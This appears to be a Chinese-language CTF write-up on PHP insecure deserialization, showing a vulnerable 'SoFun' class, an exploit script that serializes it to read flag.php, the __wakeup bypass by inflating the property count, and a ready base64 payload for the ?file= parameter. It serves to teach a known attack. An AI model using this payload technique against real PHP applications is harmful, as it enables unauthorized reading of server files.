# Deserialize

不安全的反序列化漏洞：


## 概念
对象(```object```)从可变到不可变的过程。   例如java的```writeObject```. 一旦对象被序列化，就无法在Java程序中更改。
php也有```serialize```函数。
不太形象的类比： 序列化就是JavaScript object到json的过程、反之反序列化是json到JavaScript的过程。


## 利用
一般来说利用的是反序列化，就是将修改过的恶意序列化之后的东西让程序读取，达到各种目的。
一般白盒测试用的较多


## 实战 
<br>

### 网站代码

有网站代码，目的是利用反序列化漏洞得到网站根目录下的 ```flag.php```.
网站代码：
```php
<?php
class SoFun {
	protected $file='index.php';
	function __destruct() {
		if(!empty($this->file)) {
			if(strchr($this-> file,"\\")===false && strchr($this->file, '/')===false)
				show_source(dirname (__FILE__).'/'.$this ->file);
		}
		else {
			die('Wrong filename.');
		}
	}

	function __wakeup() {
		$this-> file='index.php';
	}
	public function __toString() {
		return '' ;
	}
}
if (!isset($_GET['file'])) {
	show_source('index.php');
} 
else {
	$file=base64_decode( $_GET['file']);
	echo unserialize($file );
}
?>
```


<br>
<br>

### 编写exp
exp代码：
```php

<?php
class SoFun {
	protected $file='flag.php';
//	function __destruct() {
//		if(!empty($this->file)) {
//		if(strchr($this-> file,"\\")===false && strchr($this->file, '/')===false)
//		show_source(dirname (__FILE__).'/'.$this ->file);
//		}
	//	else{
//			die('Wrong filename.');
	//	}
//	}
}


$C1= new SoFun();
$data=serialize($C1);
echo $data;
echo base64_encode($data);
?>



```

网站代码中需要想办法走这一分支：
```php
else {
	$file=base64_decode( $_GET['file']);
	echo unserialize($file);
}

```

所以?file=xxx
xxx需要是base64编码的序列化过的一个string，exp获取了flag.php内容序列化后的base64编码的字符串。
将字符串传入网站对应参数中，然而需要绕过魔法函数 ```__wakeup``` . ```__wakeup```会将```file```替换成```index.php```,不是想要的结果。

```__destruct```函数才是读取文件的源代码.


### 绕过```__wakeup```函数方法

```__wakeup```函数反序列化函数触发的魔法函数，会在```unserialize```之前调用。

其它魔法函数可以看php官网.

php序列化后的字符串中会有一个表示当前类有几个变量的数字，把该数字改到大于实际变量个数就可以绕过 ```__wake_up```魔法函数。


exp.php得到base64的flag.php的data，扔到testweb.php?file=base64(data)  
base64(data)代表base64之后的data

即可获得flag.php源码
``` $(data) = Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ== ```

![[Pasted image 20211209191018.png]]

flag.php内容：

```php

<?php  
 flag  
?>

```




![[Pasted image 20211209191245.png]]
![[Pasted image 20211209192218.png]]





